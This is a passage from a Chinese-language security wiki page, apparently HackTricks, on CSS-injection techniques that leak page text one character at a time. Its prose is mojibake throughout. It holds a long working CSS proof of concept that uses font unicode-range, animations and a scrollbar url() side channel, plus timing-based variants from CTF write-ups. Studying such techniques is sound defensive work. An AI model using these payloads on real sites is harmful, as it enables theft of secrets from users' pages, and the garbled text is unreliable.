å°½ç®¡è¿™ç§æ–¹æ³•å…è®¸æ£€æµ‹åˆ°ç‹¬ç‰¹å­—ç¬¦çš„å‡ºç°ï¼Œä½†å¹¶æœªæŒ‡å®šå“ªä¸ªå­—ç¬¦è¢«é‡å¤ï¼Œä»…ä»…è¡¨æ˜å‘ç”Ÿäº†é‡å¤ã€‚

{% hint style="info" %}
åŸºæœ¬ä¸Šï¼Œ**unicode-range ç”¨äºæ£€æµ‹å­—ç¬¦**ï¼Œä½†ç”±äºæˆ‘ä»¬ä¸æƒ³åŠ è½½å¤–éƒ¨å­—ä½“ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°å¦ä¸€ç§æ–¹æ³•ã€‚\
å½“ **å­—ç¬¦** è¢« **æ‰¾åˆ°** æ—¶ï¼Œå®ƒè¢« **èµ‹äºˆ** é¢„å®‰è£…çš„ **Comic Sans å­—ä½“**ï¼Œè¿™ä½¿å¾—å­—ç¬¦ **å˜å¤§** å¹¶ **è§¦å‘æ»šåŠ¨æ¡**ï¼Œè¿™å°† **æ³„éœ²æ‰¾åˆ°çš„å­—ç¬¦**ã€‚
{% endhint %}

æ£€æŸ¥ä» PoC ä¸­æå–çš„ä»£ç ï¼š
```css
/* comic sans is high (lol) and causes a vertical overflow */
@font-face{font-family:has_A;src:local('Comic Sans MS');unicode-range:U+41;font-style:monospace;}
@font-face{font-family:has_B;src:local('Comic Sans MS');unicode-range:U+42;font-style:monospace;}
@font-face{font-family:has_C;src:local('Comic Sans MS');unicode-range:U+43;font-style:monospace;}
@font-face{font-family:has_D;src:local('Comic Sans MS');unicode-range:U+44;font-style:monospace;}
@font-face{font-family:has_E;src:local('Comic Sans MS');unicode-range:U+45;font-style:monospace;}
@font-face{font-family:has_F;src:local('Comic Sans MS');unicode-range:U+46;font-style:monospace;}
@font-face{font-family:has_G;src:local('Comic Sans MS');unicode-range:U+47;font-style:monospace;}
@font-face{font-family:has_H;src:local('Comic Sans MS');unicode-range:U+48;font-style:monospace;}
@font-face{font-family:has_I;src:local('Comic Sans MS');unicode-range:U+49;font-style:monospace;}
@font-face{font-family:has_J;src:local('Comic Sans MS');unicode-range:U+4a;font-style:monospace;}
@font-face{font-family:has_K;src:local('Comic Sans MS');unicode-range:U+4b;font-style:monospace;}
@font-face{font-family:has_L;src:local('Comic Sans MS');unicode-range:U+4c;font-style:monospace;}
@font-face{font-family:has_M;src:local('Comic Sans MS');unicode-range:U+4d;font-style:monospace;}
@font-face{font-family:has_N;src:local('Comic Sans MS');unicode-range:U+4e;font-style:monospace;}
@font-face{font-family:has_O;src:local('Comic Sans MS');unicode-range:U+4f;font-style:monospace;}
@font-face{font-family:has_P;src:local('Comic Sans MS');unicode-range:U+50;font-style:monospace;}
@font-face{font-family:has_Q;src:local('Comic Sans MS');unicode-range:U+51;font-style:monospace;}
@font-face{font-family:has_R;src:local('Comic Sans MS');unicode-range:U+52;font-style:monospace;}
@font-face{font-family:has_S;src:local('Comic Sans MS');unicode-range:U+53;font-style:monospace;}
@font-face{font-family:has_T;src:local('Comic Sans MS');unicode-range:U+54;font-style:monospace;}
@font-face{font-family:has_U;src:local('Comic Sans MS');unicode-range:U+55;font-style:monospace;}
@font-face{font-family:has_V;src:local('Comic Sans MS');unicode-range:U+56;font-style:monospace;}
@font-face{font-family:has_W;src:local('Comic Sans MS');unicode-range:U+57;font-style:monospace;}
@font-face{font-family:has_X;src:local('Comic Sans MS');unicode-range:U+58;font-style:monospace;}
@font-face{font-family:has_Y;src:local('Comic Sans MS');unicode-range:U+59;font-style:monospace;}
@font-face{font-family:has_Z;src:local('Comic Sans MS');unicode-range:U+5a;font-style:monospace;}
@font-face{font-family:has_0;src:local('Comic Sans MS');unicode-range:U+30;font-style:monospace;}
@font-face{font-family:has_1;src:local('Comic Sans MS');unicode-range:U+31;font-style:monospace;}
@font-face{font-family:has_2;src:local('Comic Sans MS');unicode-range:U+32;font-style:monospace;}
@font-face{font-family:has_3;src:local('Comic Sans MS');unicode-range:U+33;font-style:monospace;}
@font-face{font-family:has_4;src:local('Comic Sans MS');unicode-range:U+34;font-style:monospace;}
@font-face{font-family:has_5;src:local('Comic Sans MS');unicode-range:U+35;font-style:monospace;}
@font-face{font-family:has_6;src:local('Comic Sans MS');unicode-range:U+36;font-style:monospace;}
@font-face{font-family:has_7;src:local('Comic Sans MS');unicode-range:U+37;font-style:monospace;}
@font-face{font-family:has_8;src:local('Comic Sans MS');unicode-range:U+38;font-style:monospace;}
@font-face{font-family:has_9;src:local('Comic Sans MS');unicode-range:U+39;font-style:monospace;}
@font-face{font-family:rest;src: local('Courier New');font-style:monospace;unicode-range:U+0-10FFFF}

div.leak {
overflow-y: auto; /* leak channel */
overflow-x: hidden; /* remove false positives */
height: 40px; /* comic sans capitals exceed this height */
font-size: 0px; /* make suffix invisible */
letter-spacing: 0px; /* separation */
word-break: break-all; /* small width split words in lines */
font-family: rest; /* default */
background: grey; /* default */
width: 0px; /* initial value */
animation: loop step-end 200s 0s, trychar step-end 2s 0s; /* animations: trychar duration must be 1/100th of loop duration */
animation-iteration-count: 1, infinite; /* single width iteration, repeat trychar one per width increase (or infinite) */
}

div.leak::first-line{
font-size: 30px; /* prefix is visible in first line */
text-transform: uppercase; /* only capital letters leak */
}

/* iterate over all chars */
@keyframes trychar {
0% { font-family: rest; } /* delay for width change */
5% { font-family: has_A, rest; --leak: url(?a); }
6% { font-family: rest; }
10% { font-family: has_B, rest; --leak: url(?b); }
11% { font-family: rest; }
15% { font-family: has_C, rest; --leak: url(?c); }
16% { font-family: rest }
20% { font-family: has_D, rest; --leak: url(?d); }
21% { font-family: rest; }
25% { font-family: has_E, rest; --leak: url(?e); }
26% { font-family: rest; }
30% { font-family: has_F, rest; --leak: url(?f); }
31% { font-family: rest; }
35% { font-family: has_G, rest; --leak: url(?g); }
36% { font-family: rest; }
40% { font-family: has_H, rest; --leak: url(?h); }
41% { font-family: rest }
45% { font-family: has_I, rest; --leak: url(?i); }
46% { font-family: rest; }
50% { font-family: has_J, rest; --leak: url(?j); }
51% { font-family: rest; }
55% { font-family: has_K, rest; --leak: url(?k); }
56% { font-family: rest; }
60% { font-family: has_L, rest; --leak: url(?l); }
61% { font-family: rest; }
65% { font-family: has_M, rest; --leak: url(?m); }
66% { font-family: rest; }
70% { font-family: has_N, rest; --leak: url(?n); }
71% { font-family: rest; }
75% { font-family: has_O, rest; --leak: url(?o); }
76% { font-family: rest; }
80% { font-family: has_P, rest; --leak: url(?p); }
81% { font-family: rest; }
85% { font-family: has_Q, rest; --leak: url(?q); }
86% { font-family: rest; }
90% { font-family: has_R, rest; --leak: url(?r); }
91% { font-family: rest; }
95% { font-family: has_S, rest; --leak: url(?s); }
96% { font-family: rest; }
}

/* increase width char by char, i.e. add new char to prefix */
@keyframes loop {
0% { width: 0px }
1% { width: 20px }
2% { width: 40px }
3% { width: 60px }
4% { width: 80px }
4% { width: 100px }
5% { width: 120px }
6% { width: 140px }
7% { width: 0px }
}

div::-webkit-scrollbar {
background: blue;
}

/* side-channel */
div::-webkit-scrollbar:vertical {
background: blue var(--leak);
}
```
### æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ (III)ï¼šé€šè¿‡éšè—å…ƒç´ ä»¥é»˜è®¤å­—ä½“æ³„éœ²å­—ç¬¦é›†ï¼ˆä¸éœ€è¦å¤–éƒ¨èµ„æºï¼‰ <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒï¼š** è¿™åœ¨[è¿™ç¯‡æ–‡ç« ä¸­è¢«æåˆ°ä½œä¸ºä¸€ä¸ªä¸æˆåŠŸçš„è§£å†³æ–¹æ¡ˆ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

è¿™ä¸ªæ¡ˆä¾‹ä¸ä¹‹å‰çš„éå¸¸ç›¸ä¼¼ï¼Œç„¶è€Œï¼Œåœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œç‰¹å®š**å­—ç¬¦æ¯”å…¶ä»–å­—ç¬¦æ›´å¤§æ˜¯ä¸ºäº†éšè—æŸäº›ä¸œè¥¿**ï¼Œæ¯”å¦‚ä¸€ä¸ªä¸å¸Œæœ›è¢«æœºå™¨äººç‚¹å‡»çš„æŒ‰é’®æˆ–ä¸€ä¸ªä¸ä¼šè¢«åŠ è½½çš„å›¾åƒã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥æµ‹é‡è¿™ä¸ªåŠ¨ä½œï¼ˆæˆ–ç¼ºä¹åŠ¨ä½œï¼‰ï¼Œå¹¶çŸ¥é“ç‰¹å®šå­—ç¬¦æ˜¯å¦å­˜åœ¨äºæ–‡æœ¬ä¸­ã€‚

### æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ (III)ï¼šé€šè¿‡ç¼“å­˜æ—¶é—´æ³„éœ²å­—ç¬¦é›†ï¼ˆä¸éœ€è¦å¤–éƒ¨èµ„æºï¼‰ <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒï¼š** è¿™åœ¨[è¿™ç¯‡æ–‡ç« ä¸­è¢«æåˆ°ä½œä¸ºä¸€ä¸ªä¸æˆåŠŸçš„è§£å†³æ–¹æ¡ˆ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

åœ¨è¿™ä¸ªæ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•é€šè¿‡ä»åŒä¸€æ¥æºåŠ è½½ä¸€ä¸ªå‡å­—ä½“æ¥æ³„éœ²å­—ç¬¦æ˜¯å¦åœ¨æ–‡æœ¬ä¸­ï¼š
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1);
unicode-range: U+0041;
}
```
å¦‚æœæœ‰åŒ¹é…ï¼Œ**å­—ä½“å°†ä» `/static/bootstrap.min.css?q=1` åŠ è½½**ã€‚è™½ç„¶å®ƒä¸ä¼šæˆåŠŸåŠ è½½ï¼Œä½†**æµè§ˆå™¨åº”è¯¥ç¼“å­˜å®ƒ**ï¼Œå³ä½¿æ²¡æœ‰ç¼“å­˜ï¼Œä¹Ÿæœ‰**304æœªä¿®æ”¹**æœºåˆ¶ï¼Œå› æ­¤**å“åº”åº”è¯¥æ¯”å…¶ä»–å†…å®¹æ›´å¿«**ã€‚

ç„¶è€Œï¼Œå¦‚æœç¼“å­˜å“åº”ä¸éç¼“å­˜å“åº”çš„æ—¶é—´å·®ä¸å¤Ÿå¤§ï¼Œè¿™å°†æ²¡æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œä½œè€…æåˆ°ï¼šç„¶è€Œï¼Œç»è¿‡æµ‹è¯•ï¼Œæˆ‘å‘ç°ç¬¬ä¸€ä¸ªé—®é¢˜æ˜¯é€Ÿåº¦æ²¡æœ‰å¤ªå¤§å·®åˆ«ï¼Œç¬¬äºŒä¸ªé—®é¢˜æ˜¯æœºå™¨äººä½¿ç”¨äº† `disk-cache-size=1` æ ‡å¿—ï¼Œè¿™çœŸçš„å¾ˆå‘¨åˆ°ã€‚

### æ–‡æœ¬èŠ‚ç‚¹å¤–æ³„ (III)ï¼šé€šè¿‡å®šæ—¶åŠ è½½æ•°ç™¾ä¸ªæœ¬åœ°â€œå­—ä½“â€ï¼ˆä¸éœ€è¦å¤–éƒ¨èµ„æºï¼‰æ³„éœ²å­—ç¬¦é›† <a href="#text-node-exfiltration-ii-leaking-the-charset-with-a-default-font" id="text-node-exfiltration-ii-leaking-the-charset-with-a-default-font"></a>

**å‚è€ƒï¼š** è¿™åœ¨[è¿™ç¯‡æ–‡ç« ä¸­è¢«æåˆ°ä½œä¸ºä¸€ä¸ªä¸æˆåŠŸçš„è§£å†³æ–¹æ¡ˆ](https://blog.huli.tw/2022/06/14/en/justctf-2022-writeup/#ninja1-solves)

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“å‘ç”ŸåŒ¹é…æ—¶ï¼Œæ‚¨å¯ä»¥æŒ‡ç¤º**CSSä»åŒä¸€æ¥æºåŠ è½½æ•°ç™¾ä¸ªå‡å­—ä½“**ã€‚è¿™æ ·æ‚¨å¯ä»¥**æµ‹é‡æ‰€éœ€æ—¶é—´**ï¼Œå¹¶æ‰¾å‡ºå­—ç¬¦æ˜¯å¦å‡ºç°ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š
```css
@font-face {
font-family: "A1";
src: url(/static/bootstrap.min.css?q=1),
url(/static/bootstrap.min.css?q=2),
....
url(/static/bootstrap.min.css?q=500);
unicode-range: U+0041;
}
```
è€Œæœºå™¨äººçš„ä»£ç å¦‚ä¸‹ï¼š
```python
browser.get(url)
WebDriverWait(browser, 30).until(lambda r: r.execute_script('return document.readyState') == 'complete')
time.sleep(30)
```
æ‰€ä»¥ï¼Œå¦‚æœå­—ä½“ä¸åŒ¹é…ï¼Œè®¿é—®æœºå™¨äººæ—¶çš„å“åº”æ—¶é—´é¢„è®¡çº¦ä¸º 30 ç§’ã€‚ç„¶è€Œï¼Œå¦‚æœå­˜åœ¨å­—ä½“åŒ¹é…ï¼Œå°†ä¼šå‘é€å¤šä¸ªè¯·æ±‚ä»¥æ£€ç´¢å­—ä½“ï¼Œå¯¼è‡´ç½‘ç»œæŒç»­æ´»åŠ¨ã€‚å› æ­¤ï¼Œæ»¡è¶³åœæ­¢æ¡ä»¶å¹¶æ¥æ”¶å“åº”æ‰€éœ€çš„æ—¶é—´ä¼šæ›´é•¿ã€‚å› æ­¤ï¼Œå“åº”æ—¶é—´å¯ä»¥ä½œä¸ºåˆ¤æ–­æ˜¯å¦å­˜åœ¨å­—ä½“åŒ¹é…çš„æŒ‡æ ‡ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)
* [https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b](https://d0nut.medium.com/better-exfiltration-via-html-injection-31c72a2dae8b)
* [https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d](https://infosecwriteups.com/exfiltration-via-css-injection-4e999f63097d)
* [https://x-c3ll.github.io/posts/CSS-Injection-Primitives/](https://x-c3ll.github.io/posts/CSS-Injection-Primitives/)

{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
